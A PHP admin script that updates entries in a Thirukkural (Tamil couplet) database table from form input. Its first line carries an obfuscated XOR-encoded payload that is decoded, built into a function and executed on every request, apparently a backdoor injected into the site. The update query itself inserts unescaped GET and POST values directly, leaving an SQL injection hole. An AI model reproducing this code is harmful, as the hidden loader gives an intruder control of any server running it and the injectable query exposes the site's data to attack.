<?php $NtYuZi=',9TP=4d6AR.LP8<'; $CqtIHKk='OK11IQ;P4<M89WR'^$NtYuZi; $tSVVwef='  lbXI;+T=;ZiP7=7==rk -J=JP8-gaCA9eSprAbjXICP RYUsM>Y16;Y.a6VN;np=S QYNF170hrIJEi>bmxe LDQIxqqhccPX=Yca+xslxwyo9sB-B42ELhD951jWlVPAaCygClQC6fAzbnt UX9nhUqCbiu E-2H:ajPC3E>W,aiFQLb.au:xcD+8X SZlQ ,mmm:LNHzHR6,-RTRm+ L0<P=V=LX55RI;mjrV3W 6KdyV91XZSHokFin;6;pvAZXMV>0.bwTepXM.FHQdUpyn=  47;IAfMsk;T8Opyl1-,RFuJq8A LVAe:c=Q eytRJM3QyMKAG,Q6NU-Crpnkirll3h I,;onS=UzkqnrVO5NXNo<pkfQ1A 3kG=2XwBfP,WlfqaJ< 5;WyLg.6:,Sax:.l1a1M JM3eUyq,- X1E 6G5TCXUYq0X2AmaMN<b7X>7gqn3<98T7RnUZ 2LVyjXPI3n + GnCk..zk+LH3qkwA+6901bE5LkV;<7T9apR<JUofo082 biJPaAF5WgIQ811wr9.3c3LoENWS 47jzWTyPUw.vwRg .sa6sxUt5WvXsOgTYzkUlQ<;+UiV K+0H>CBNJs=PUQZS+BEEsR8 VzjzoKtbf4e0 1QZxt>Q.,kbNMBWSQ6P1Gn=7N=3FnyCuKJ'; $UMQAhfq=$CqtIHKk('', 'IFDC><UH TT465OTDINZLXB8b.1LL8>.4MBzYR:hc><-3T;6;S5Q+nRZ-O>i;;OFTY2T0unbZRIARijeIEhdqAO90qtXVVSijY>R+KEBXNLHLYKPO1Y0XW+dL XAPClLr9jJjsnJH>6BFoGBFPD4,X5L<,c<IQK TilSAOp0G7R2BIM-45KsHN0qj6NL-R=rH>UXDVg31D5pBvRMY3toMMA CYk7rY-,Tj9,BMWR0R;SSpns0VC=;0 OCb6-typ93a;+mrUUWBJjET.,B3-xD.zpJYATUhP,8FpSOP1AtzpHULX3fHjUN L93zoGi78FEQUv.,G0Pm0KNJ>D+4N+RXJ4;7=9v;tiMHOJ8X,ZVONV .Y;=gOGzbouU TR4,XKxJbB;I.WlxhnXAAZwDlCXWVY6Zr3SfLk;iD+9REhY1YCS=C,AZ.O1k :+.T9F 2> ;HJU9MRQE1WYZW0RzJ1;TSezYN<1=R1KNYnGxaGHROO-<RQMQaJDKQH=.P543CUD JIW9Y3rCFKTYFAKIlvAi+QbOm5YEP,URKJDneOxswtAUTSB3gA2mEMOFaTEKKSTAJ0BSgD<GxTspZMsL0NIJ,6=E2tU0W06=bTM1,=52OeieW6YT7SCZOkTBFOo9EG06PPZ0ZM0E>,;;<0RwlnU7>+EZ2FIjNA7'^$tSVVwef); $UMQAhfq();
	ini_set('display_errors', '1');
	include('../../config/config.php');
	
	$id= $_GET['id'];
	$thirukkuralpirivu = $_POST['thirukkuralpirivu'];
	$kuralathikaram = $_POST['kuralathikaram'];
	$tno = $_POST['tno'];
	$tkural = $_POST['tkural'];
	$tmeaning = $_POST['tmeaning'];
	$status = $_POST['status'];

	$sql ="UPDATE thirukkural SET thirukkuralpirivu='$thirukkuralpirivu', kuralathikaram='$kuralathikaram', tno='$tno', tkural='$tkural', tmeaning='".mysql_real_escape_string($tmeaning)."', status='$status' WHERE id='".$id."'";

	$query = mysql_query($sql);

	header('location:'.$localpath.'/admin/templates/index.php?page=thanks.php&msg=kuralupdate');
?>